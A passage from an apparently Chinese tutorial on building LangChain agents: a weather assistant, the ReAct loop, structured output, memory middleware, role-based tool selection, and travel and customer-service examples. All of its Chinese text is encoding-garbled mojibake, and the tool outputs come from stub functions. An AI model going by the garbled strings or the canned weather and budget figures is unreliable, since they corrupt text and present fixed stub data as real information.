    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä¸Šæµ·è¿™å‘¨æœ«å¤©æ°”å¦‚ä½•ï¼Ÿæˆ‘æƒ³å»å¤–æ»©"</span>}]
})
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”¨æˆ·ï¼šä¸Šæµ·è¿™å‘¨æœ«å¤©æ°”å¦‚ä½•ï¼Ÿæˆ‘æƒ³å»å¤–æ»©"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ©æ‰‹ï¼š<span class="hljs-subst">{result2[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)
</code></pre>
<p><strong>è¿è¡Œç»“æœï¼š</strong></p>
<pre><code class="hljs">ğŸ¤– å¤©æ°”åŠ©æ‰‹å·²å¯åŠ¨ï¼

ç”¨æˆ·ï¼šåŒ—äº¬ç°åœ¨å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ
åŠ©æ‰‹ï¼šåŒ—äº¬ç°åœ¨å¤©æ°”å¾ˆå¥½ï¼â˜€ï¸ æ™´å¤©ï¼Œæ¸©åº¦ 15Â°Cï¼Œç©ºæ°”è´¨é‡è‰¯å¥½ã€‚é€‚åˆå¤–å‡ºæ´»åŠ¨ï¼Œå»ºè®®ç©¿è–„å¤–å¥—ã€‚

ç”¨æˆ·ï¼šä¸Šæµ·è¿™å‘¨æœ«å¤©æ°”å¦‚ä½•ï¼Ÿæˆ‘æƒ³å»å¤–æ»©
åŠ©æ‰‹ï¼šä¸Šæµ·è¿™å‘¨æœ«å¤©æ°”é¢„æŠ¥ï¼š
ç¬¬1å¤©ï¼šæ™´ 20Â°C
ç¬¬2å¤©ï¼šå¤šäº‘ 18Â°C  
ç¬¬3å¤©ï¼šå°é›¨ 16Â°C

å»ºè®®å‘¨å…­å»å¤–æ»©ï¼Œå¤©æ°”æœ€å¥½ï¼å‘¨æ—¥å¯èƒ½æœ‰å°é›¨ï¼Œè®°å¾—å¸¦ä¼å“¦ã€‚â˜”
</code></pre>
<hr/>
<h2 data-id="heading-10">æ·±å…¥ç†è§£ï¼šAgent çš„å·¥ä½œåŸç†</h2>
<h3 data-id="heading-11">ğŸ”„ ReAct å¾ªç¯ï¼šæ¨ç† + è¡ŒåŠ¨</h3>
<p>Agent ä½¿ç”¨ <strong>ReAct</strong>ï¼ˆReasoning + Actingï¼‰æ¨¡å¼å·¥ä½œï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ReAct å·¥ä½œæµç¨‹                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

<span class="hljs-number">1</span>ï¸âƒ£ ç”¨æˆ·è¾“å…¥ï¼š
   <span class="hljs-string">"å¸®æˆ‘æŸ¥è¯¢åŒ—äº¬å’Œä¸Šæµ·çš„å¤©æ°”ï¼Œç„¶åå‘Šè¯‰æˆ‘å“ªä¸ªåŸå¸‚æ›´é€‚åˆæ—…æ¸¸"</span>

<span class="hljs-number">2</span>ï¸âƒ£ Agent æ¨ç†ï¼š
   ğŸ’­ <span class="hljs-string">"æˆ‘éœ€è¦å…ˆè·å–ä¸¤ä¸ªåŸå¸‚çš„å¤©æ°”ä¿¡æ¯ï¼Œç„¶åè¿›è¡Œæ¯”è¾ƒ"</span>

<span class="hljs-number">3</span>ï¸âƒ£ Agent è¡ŒåŠ¨ï¼š
   ğŸ”§ è°ƒç”¨å·¥å…· <span class="hljs-built_in">get_weather</span>(<span class="hljs-string">"åŒ—äº¬"</span>)
   
<span class="hljs-number">4</span>ï¸âƒ£ è§‚å¯Ÿç»“æœï¼š
   ğŸ“Š <span class="hljs-string">"åŒ—äº¬ï¼šæ™´å¤©ï¼Œ15Â°Cï¼Œç©ºæ°”è´¨é‡è‰¯å¥½"</span>

<span class="hljs-number">5</span>ï¸âƒ£ Agent å†æ¬¡æ¨ç†ï¼š
   ğŸ’­ <span class="hljs-string">"å¥½çš„ï¼Œå·²ç»æœ‰åŒ—äº¬çš„å¤©æ°”äº†ï¼Œç°åœ¨è·å–ä¸Šæµ·çš„"</span>

<span class="hljs-number">6</span>ï¸âƒ£ Agent å†æ¬¡è¡ŒåŠ¨ï¼š
   ğŸ”§ è°ƒç”¨å·¥å…· <span class="hljs-built_in">get_weather</span>(<span class="hljs-string">"ä¸Šæµ·"</span>)

<span class="hljs-number">7</span>ï¸âƒ£ è§‚å¯Ÿç»“æœï¼š
   ğŸ“Š <span class="hljs-string">"ä¸Šæµ·ï¼šå¤šäº‘ï¼Œ18Â°Cï¼Œæœ‰è½»å¾®é›¾éœ¾"</span>

<span class="hljs-number">8</span>ï¸âƒ£ Agent æœ€ç»ˆæ¨ç†ï¼š
   ğŸ’­ <span class="hljs-string">"ç°åœ¨æˆ‘æœ‰ä¸¤ä¸ªåŸå¸‚çš„å¤©æ°”æ•°æ®ï¼Œå¯ä»¥è¿›è¡Œæ¯”è¾ƒäº†"</span>

<span class="hljs-number">9</span>ï¸âƒ£ è¾“å‡ºç­”æ¡ˆï¼š
   âœ… <span class="hljs-string">"æ ¹æ®å¤©æ°”æƒ…å†µï¼ŒåŒ—äº¬æ›´é€‚åˆæ—…æ¸¸ã€‚åŒ—äº¬æ˜¯æ™´å¤©ä¸”ç©ºæ°”è´¨é‡è‰¯å¥½ï¼Œ
       è€Œä¸Šæµ·å¤šäº‘ä¸”æœ‰è½»å¾®é›¾éœ¾ã€‚å»ºè®®é€‰æ‹©åŒ—äº¬ã€‚"</span>
</code></pre>
<h3 data-id="heading-12">ğŸ“ˆ å®é™…æ‰§è¡Œè¿½è¸ª</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¯ç”¨è¯¦ç»†è¿½è¸ªæ¨¡å¼</span>
agent = create_agent(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    tools=[get_weather, get_weather_forecast],
    system_prompt=<span class="hljs-string">"ä½ æ˜¯å¤©æ°”åŠ©æ‰‹"</span>
)

<span class="hljs-comment"># æµå¼è¾“å‡ºï¼ŒæŸ¥çœ‹ä¸­é—´æ­¥éª¤</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ” Agent æ‰§è¡Œè¿½è¸ª"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

<span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> agent.stream(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æ¯”è¾ƒåŒ—äº¬å’Œä¸Šæµ·çš„å¤©æ°”"</span>}]},
    stream_mode=<span class="hljs-string">"values"</span>
):
    latest_message = chunk[<span class="hljs-string">"messages"</span>][-<span class="hljs-number">1</span>]
    
    <span class="hljs-keyword">if</span> latest_message.content:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nğŸ’¬ Agent å›å¤ï¼š<span class="hljs-subst">{latest_message.content}</span>"</span>)
    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(latest_message, <span class="hljs-string">'tool_calls'</span>) <span class="hljs-keyword">and</span> latest_message.tool_calls:
        tool_names = [tc[<span class="hljs-string">'name'</span>] <span class="hljs-keyword">for</span> tc <span class="hljs-keyword">in</span> latest_message.tool_calls]
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nğŸ”§ æ­£åœ¨è°ƒç”¨å·¥å…·ï¼š<span class="hljs-subst">{<span class="hljs-string">', '</span>.join(tool_names)}</span>"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-13">é«˜çº§ç‰¹æ€§</h2>
<h3 data-id="heading-14">1. ğŸ¯ ç»“æ„åŒ–è¾“å‡º</h3>
<p>è®© Agent è¿”å›æ ¼å¼åŒ–çš„æ•°æ®ç»“æ„ï¼Œè€Œä¸æ˜¯çº¯æ–‡æœ¬ã€‚LangChain é€šè¿‡ <code>response_format</code> å‚æ•°æä¾›ç»“æ„åŒ–è¾“å‡ºç­–ç•¥ã€‚</p>
<p><strong>ToolStrategy</strong></p>
<p>ToolStrategy ä½¿ç”¨äººå·¥å·¥å…·è°ƒç”¨æ¥ç”Ÿæˆç»“æ„åŒ–è¾“å‡ºã€‚è¿™é€‚ç”¨äºä»»ä½•æ”¯æŒå·¥å…·è°ƒç”¨çš„æ¨¡å‹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, Field
<span class="hljs-keyword">from</span> langchain.agents.structured_output <span class="hljs-keyword">import</span> ToolStrategy

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WeatherReport</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-string">"""å¤©æ°”æŠ¥å‘Šæ•°æ®æ¨¡å‹"""</span>
    city: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"åŸå¸‚åç§°"</span>)
    temperature: <span class="hljs-built_in">int</span> = Field(description=<span class="hljs-string">"æ¸©åº¦ï¼ˆæ‘„æ°åº¦ï¼‰"</span>)
    weather: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"å¤©æ°”çŠ¶å†µ"</span>)
    suggestion: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"å‡ºè¡Œå»ºè®®"</span>)

<span class="hljs-comment"># åˆ›å»ºè¿”å›ç»“æ„åŒ–è¾“å‡ºçš„ Agent</span>
structured_agent = create_agent(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    tools=[get_weather],
    response_format=ToolStrategy(WeatherReport)
)

result = structured_agent.invoke({
    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æŸ¥è¯¢åŒ—äº¬å¤©æ°”"</span>}]
})

<span class="hljs-comment"># è·å–ç»“æ„åŒ–æ•°æ®</span>
weather_data = result[<span class="hljs-string">"structured_response"</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŸå¸‚ï¼š<span class="hljs-subst">{weather_data.city}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¸©åº¦ï¼š<span class="hljs-subst">{weather_data.temperature}</span>Â°C"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤©æ°”ï¼š<span class="hljs-subst">{weather_data.weather}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å»ºè®®ï¼š<span class="hljs-subst">{weather_data.suggestion}</span>"</span>)
</code></pre>
<p><strong>è¾“å‡ºç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs">åŸå¸‚ï¼šåŒ—äº¬
æ¸©åº¦ï¼š15Â°C
å¤©æ°”ï¼šæ™´å¤©
å»ºè®®ï¼šå¤©æ°”æ™´æœ—ï¼Œé€‚åˆæˆ·å¤–æ´»åŠ¨ï¼Œå»ºè®®ç©¿è–„å¤–å¥—
</code></pre>
<p><strong>ProviderStrategy</strong></p>
<p>ä½¿ç”¨æ¨¡å‹æä¾›è€…åŸç”Ÿçš„ç»“æ„åŒ–è¾“å‡ºç”Ÿæˆã€‚è¿™æ›´å¯é ï¼Œä½†ä»…é€‚ç”¨äºæ”¯æŒåŸç”Ÿç»“æ„åŒ–è¾“å‡ºçš„æä¾›è€…ï¼ˆä¾‹å¦‚ OpenAIï¼‰ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents.structured_output <span class="hljs-keyword">import</span> ProviderStrategy

agent = create_agent(
    model=<span class="hljs-string">"gpt-4o"</span>,
    response_format=ProviderStrategy(ContactInfo)
)
</code></pre>
<h3 data-id="heading-15">2. ğŸ§  è®°å¿†ä¸çŠ¶æ€ç®¡ç†</h3>
<p>è®© Agent è®°ä½å¯¹è¯ä¸Šä¸‹æ–‡å’Œç”¨æˆ·åå¥½ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> AgentState
<span class="hljs-keyword">from</span> langchain.agents.middleware <span class="hljs-keyword">import</span> AgentMiddleware
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict

<span class="hljs-comment"># å®šä¹‰è‡ªå®šä¹‰çŠ¶æ€</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WeatherAgentState</span>(<span class="hljs-title class_ inherited__">AgentState</span>):
    user_preferences: <span class="hljs-built_in">dict</span>  <span class="hljs-comment"># ç”¨æˆ·åå¥½</span>
    search_history: <span class="hljs-built_in">list</span>    <span class="hljs-comment"># æœç´¢å†å²</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryMiddleware</span>(<span class="hljs-title class_ inherited__">AgentMiddleware</span>):
    <span class="hljs-string">"""å¸¦è®°å¿†çš„ä¸­é—´ä»¶"""</span>
    state_schema = WeatherAgentState
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">before_model</span>(<span class="hljs-params">self, state, runtime</span>):
        <span class="hljs-comment"># åœ¨è°ƒç”¨æ¨¡å‹å‰ï¼Œæ·»åŠ å†å²è®°å½•åˆ°ä¸Šä¸‹æ–‡</span>
        history = state.get(<span class="hljs-string">"search_history"</span>, [])
        <span class="hljs-keyword">if</span> history:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“š ç”¨æˆ·å†å²æŸ¥è¯¢ï¼š<span class="hljs-subst">{<span class="hljs-string">', '</span>.join(history[-<span class="hljs-number">3</span>:])}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># åˆ›å»ºå¸¦è®°å¿†çš„ Agent</span>
memory_agent = create_agent(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    tools=[get_weather],
    middleware=[MemoryMiddleware()]
)

<span class="hljs-comment"># ä½¿ç”¨å¸¦çŠ¶æ€çš„è°ƒç”¨</span>
result = memory_agent.invoke({
    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"åŒ—äº¬å¤©æ°”"</span>}],
    <span class="hljs-string">"user_preferences"</span>: {<span class="hljs-string">"temperature_unit"</span>: <span class="hljs-string">"celsius"</span>},
    <span class="hljs-string">"search_history"</span>: [<span class="hljs-string">"ä¸Šæµ·"</span>, <span class="hljs-string">"å¹¿å·"</span>, <span class="hljs-string">"æ·±åœ³"</span>]
})
</code></pre>
<h3 data-id="heading-16">3. ğŸ”€ åŠ¨æ€å·¥å…·é€‰æ‹©</h3>
<p>æ ¹æ®ä¸åŒåœºæ™¯åŠ¨æ€æä¾›ä¸åŒçš„å·¥å…·é›†ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents.middleware <span class="hljs-keyword">import</span> wrap_model_call

<span class="hljs-meta">@wrap_model_call</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">permission_based_tools</span>(<span class="hljs-params">request, handler</span>):
    <span class="hljs-string">"""æ ¹æ®ç”¨æˆ·æƒé™åŠ¨æ€é€‰æ‹©å·¥å…·"""</span>
    user_role = request.runtime.context.get(<span class="hljs-string">"user_role"</span>, <span class="hljs-string">"guest"</span>)
    
    <span class="hljs-keyword">if</span> user_role == <span class="hljs-string">"admin"</span>:
        <span class="hljs-comment"># ç®¡ç†å‘˜æ‹¥æœ‰æ‰€æœ‰å·¥å…·</span>
        tools = [get_weather, get_weather_forecast, update_weather_data]
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ” ç®¡ç†å‘˜æƒé™ï¼šæ‰€æœ‰å·¥å…·å¯ç”¨"</span>)
    <span class="hljs-keyword">elif</span> user_role == <span class="hljs-string">"vip"</span>:
        <span class="hljs-comment"># VIP ç”¨æˆ·å¯ä»¥ä½¿ç”¨é«˜çº§åŠŸèƒ½</span>
        tools = [get_weather, get_weather_forecast]
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"â­ VIP æƒé™ï¼šåŸºç¡€ + é¢„æŠ¥å·¥å…·"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># æ™®é€šç”¨æˆ·åªèƒ½æŸ¥è¯¢åŸºç¡€å¤©æ°”</span>
        tools = [get_weather]
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ‘¤ æ™®é€šæƒé™ï¼šä»…åŸºç¡€å·¥å…·"</span>)
    
    <span class="hljs-keyword">return</span> handler(request.override(tools=tools))

dynamic_tool_agent = create_agent(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    tools=[get_weather, get_weather_forecast],
    middleware=[permission_based_tools]
)

<span class="hljs-comment"># ä»¥ä¸åŒè§’è‰²è°ƒç”¨</span>
result = dynamic_tool_agent.invoke(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æŸ¥è¯¢å¤©æ°”"</span>}]},
    context={<span class="hljs-string">"user_role"</span>: <span class="hljs-string">"vip"</span>}
)
</code></pre>
<hr/>
<h2 data-id="heading-17">å®æˆ˜æ¡ˆä¾‹</h2>
<h3 data-id="heading-18">ğŸŒŸ æ¡ˆä¾‹1ï¼šæ™ºèƒ½æ—…æ¸¸åŠ©æ‰‹</h3>
<p>ç»“åˆå¤šä¸ªå·¥å…·çš„ç»¼åˆåº”ç”¨ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> tool
<span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">from</span> langchain_deepseek <span class="hljs-keyword">import</span> ChatDeepSeek

<span class="hljs-comment"># å®šä¹‰å¤šä¸ªæ—…æ¸¸ç›¸å…³å·¥å…·</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""è·å–åŸå¸‚å¤©æ°”"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{city}</span>ï¼šæ™´å¤©ï¼Œé€‚åˆæ—…æ¸¸"</span>

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">search_attractions</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""æœç´¢åŸå¸‚æ™¯ç‚¹"""</span>
    attractions = {
        <span class="hljs-string">"åŒ—äº¬"</span>: <span class="hljs-string">"æ•…å®«ã€é•¿åŸã€é¢å’Œå›­ã€å¤©å›"</span>,
        <span class="hljs-string">"ä¸Šæµ·"</span>: <span class="hljs-string">"å¤–æ»©ã€ä¸œæ–¹æ˜ç ã€è±«å›­ã€è¿ªå£«å°¼"</span>,
        <span class="hljs-string">"æ­å·"</span>: <span class="hljs-string">"è¥¿æ¹–ã€çµéšå¯ºã€åƒå²›æ¹–ã€å®‹åŸ"</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{city}</span>çƒ­é—¨æ™¯ç‚¹ï¼š<span class="hljs-subst">{attractions.get(city, <span class="hljs-string">'æš‚æ— æ•°æ®'</span>)}</span>"</span>

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">estimate_budget</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span>, days: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""ä¼°ç®—æ—…æ¸¸é¢„ç®—"""</span>
    daily_cost = {<span class="hljs-string">"åŒ—äº¬"</span>: <span class="hljs-number">800</span>, <span class="hljs-string">"ä¸Šæµ·"</span>: <span class="hljs-number">900</span>, <span class="hljs-string">"æ­å·"</span>: <span class="hljs-number">700</span>}
    cost = daily_cost.get(city, <span class="hljs-number">800</span>) * days
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{city}</span> <span class="hljs-subst">{days}</span>å¤©æ—…æ¸¸é¢„ç®—çº¦ï¼š<span class="hljs-subst">{cost}</span>å…ƒï¼ˆå«ä½å®¿ã€é¤é¥®ã€é—¨ç¥¨ï¼‰"</span>

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_transportation</span>(<span class="hljs-params">from_city: <span class="hljs-built_in">str</span>, to_city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""æŸ¥è¯¢äº¤é€šæ–¹å¼"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{from_city}</span> â†’ <span class="hljs-subst">{to_city}</span>ï¼šé«˜é“3å°æ—¶ï¼Œé£æœº1.5å°æ—¶"</span>

<span class="hljs-comment"># åˆ›å»ºæ—…æ¸¸åŠ©æ‰‹</span>
travel_agent = create_agent(
    model=ChatDeepSeek(model=<span class="hljs-string">"deepseek-chat"</span>, temperature=<span class="hljs-number">0.7</span>),
    tools=[get_weather, search_attractions, estimate_budget, get_transportation],
    system_prompt=<span class="hljs-string">"""ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æ—…æ¸¸è§„åˆ’åŠ©æ‰‹ã€‚

    ä½ çš„èƒ½åŠ›ï¼š
    1. æŸ¥è¯¢å¤©æ°”ä¿¡æ¯ï¼Œåˆ¤æ–­æ˜¯å¦é€‚åˆæ—…æ¸¸
    2. æ¨èçƒ­é—¨æ™¯ç‚¹ï¼Œåˆ¶å®šæ¸¸ç©è·¯çº¿
    3. ä¼°ç®—æ—…æ¸¸é¢„ç®—ï¼Œå¸®åŠ©ç”¨æˆ·åšå¥½è´¢åŠ¡è§„åˆ’
    4. æŸ¥è¯¢äº¤é€šæ–¹å¼ï¼Œæä¾›å‡ºè¡Œå»ºè®®
    
    ä½ çš„é£æ ¼ï¼š
    - çƒ­æƒ…å‹å¥½ï¼Œå……æ»¡æ—…æ¸¸çƒ­æƒ…
    - æä¾›è¯¦ç»†å®ç”¨çš„å»ºè®®
    - è€ƒè™‘ç”¨æˆ·é¢„ç®—å’Œæ—¶é—´é™åˆ¶
    """</span>
)

<span class="hljs-comment"># ç¤ºä¾‹å¯¹è¯</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ–ï¸ æ™ºèƒ½æ—…æ¸¸åŠ©æ‰‹"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

query = <span class="hljs-string">"""æˆ‘æƒ³ä»åŒ—äº¬å»æ­å·ç©3å¤©ï¼Œå¸®æˆ‘è§„åˆ’ä¸€ä¸‹ï¼š
1. ç°åœ¨å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ
2. æœ‰ä»€ä¹ˆå¥½ç©çš„åœ°æ–¹ï¼Ÿ
3. å¤§æ¦‚éœ€è¦å¤šå°‘é¢„ç®—ï¼Ÿ
4. æ€ä¹ˆå»æ¯”è¾ƒæ–¹ä¾¿ï¼Ÿ
"""</span>

result = travel_agent.invoke({
    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: query}]
})

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”¨æˆ·æé—®ï¼š\n<span class="hljs-subst">{query}</span>\n"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ©æ‰‹å›ç­”ï¼š\n<span class="hljs-subst">{result[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)
</code></pre>
<p><strong>é¢„æœŸè¾“å‡ºï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">ğŸ–ï¸ æ™ºèƒ½æ—…æ¸¸åŠ©æ‰‹
============================================================</span>
ç”¨æˆ·æé—®ï¼š
æˆ‘æƒ³ä»åŒ—äº¬å»æ­å·ç©3å¤©ï¼Œå¸®æˆ‘è§„åˆ’ä¸€ä¸‹ï¼š
<span class="hljs-bullet">1.</span> ç°åœ¨å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ
<span class="hljs-bullet">2.</span> æœ‰ä»€ä¹ˆå¥½ç©çš„åœ°æ–¹ï¼Ÿ
<span class="hljs-bullet">3.</span> å¤§æ¦‚éœ€è¦å¤šå°‘é¢„ç®—ï¼Ÿ
<span class="hljs-bullet">4.</span> æ€ä¹ˆå»æ¯”è¾ƒæ–¹ä¾¿ï¼Ÿ

åŠ©æ‰‹å›ç­”ï¼š
å¤ªå¥½äº†ï¼è®©æˆ‘ä¸ºæ‚¨è§„åˆ’è¿™æ¬¡æ­å·ä¹‹æ—… ğŸ‰

ğŸ“ <span class="hljs-strong">**ç›®çš„åœ°å¤©æ°”**</span>
æ­å·ï¼šæ™´å¤©ï¼Œéå¸¸é€‚åˆæ—…æ¸¸ï¼

ğŸ¯ <span class="hljs-strong">**æ¨èæ™¯ç‚¹**</span>
æ­å·çš„çƒ­é—¨æ™¯ç‚¹æœ‰ï¼šè¥¿æ¹–ã€çµéšå¯ºã€åƒå²›æ¹–ã€å®‹åŸ
å»ºè®®ç¬¬ä¸€å¤©æ¸¸è¥¿æ¹–ï¼Œç¬¬äºŒå¤©å»çµéšå¯ºï¼Œç¬¬ä¸‰å¤©å¯ä»¥å»å®‹åŸä½“éªŒæ–‡åŒ–æ¼”å‡ºã€‚

ğŸ’° <span class="hljs-strong">**é¢„ç®—ä¼°ç®—**</span>
3å¤©æ—…æ¸¸é¢„ç®—çº¦ï¼š2100å…ƒï¼ˆå«ä½å®¿ã€é¤é¥®ã€é—¨ç¥¨ï¼‰
å»ºè®®å¤šå‡†å¤‡500å…ƒä½œä¸ºè´­ç‰©å’Œåº”æ€¥èµ„é‡‘ã€‚

ğŸš„ <span class="hljs-strong">**äº¤é€šå»ºè®®**</span>
åŒ—äº¬ â†’ æ­å·ï¼šé«˜é“3å°æ—¶ï¼Œé£æœº1.5å°æ—¶
æ¨èä¹˜åé«˜é“ï¼Œèˆ’é€‚ä¾¿æ·ï¼Œæ²¿é€”é£æ™¯ä¹Ÿä¸é”™ï¼

ç¥æ‚¨æ—…é€”æ„‰å¿«ï¼âœˆï¸
</code></pre>
<h3 data-id="heading-19">ğŸŒŸ æ¡ˆä¾‹2ï¼šå®¢æœåŠ©æ‰‹ï¼ˆæµå¼å“åº”ï¼‰</h3>
<p>å±•ç¤ºå¦‚ä½•å®ç°æµå¼è¾“å‡ºï¼Œæå‡ç”¨æˆ·ä½“éªŒã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">search_order</span>(<span class="hljs-params">order_id: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""æŸ¥è¯¢è®¢å•ä¿¡æ¯"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"è®¢å• <span class="hljs-subst">{order_id}</span>ï¼šå·²å‘è´§ï¼Œé¢„è®¡æ˜å¤©åˆ°è¾¾"</span>

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_inventory</span>(<span class="hljs-params">product_id: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""æ£€æŸ¥åº“å­˜"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"å•†å“ <span class="hljs-subst">{product_id}</span>ï¼šåº“å­˜å……è¶³ï¼Œå¯ç«‹å³å‘è´§"</span>

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_refund</span>(<span class="hljs-params">order_id: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""å¤„ç†é€€æ¬¾"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"è®¢å• <span class="hljs-subst">{order_id}</span> é€€æ¬¾ç”³è¯·å·²æäº¤ï¼Œ3-5ä¸ªå·¥ä½œæ—¥åˆ°è´¦"</span>

customer_service_agent = create_agent(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    tools=[search_order, check_inventory, process_refund],
    system_prompt=<span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªè€å¿ƒä¸“ä¸šçš„å®¢æœåŠ©æ‰‹ã€‚"</span>
)

<span class="hljs-comment"># æµå¼è¾“å‡º</span>
